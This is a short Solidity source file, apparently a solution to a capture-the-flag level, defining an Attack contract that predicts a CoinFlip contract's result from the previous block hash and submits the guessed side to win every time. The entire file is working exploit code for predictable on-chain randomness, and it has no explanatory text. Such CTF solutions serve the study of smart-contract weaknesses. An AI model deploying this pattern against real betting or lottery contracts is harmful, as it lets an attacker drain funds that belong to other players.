import "./CoinFlip.sol";

contract Attack {

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cf;
    constructor(address _cf) {
        cf = CoinFlip(_cf);
    }

    function flip() public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
            revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            return side;
    }

    function attack() public returns (bool) {
        bool side = flip();
        bool res = cf.flip(side);
        return res;
    }

}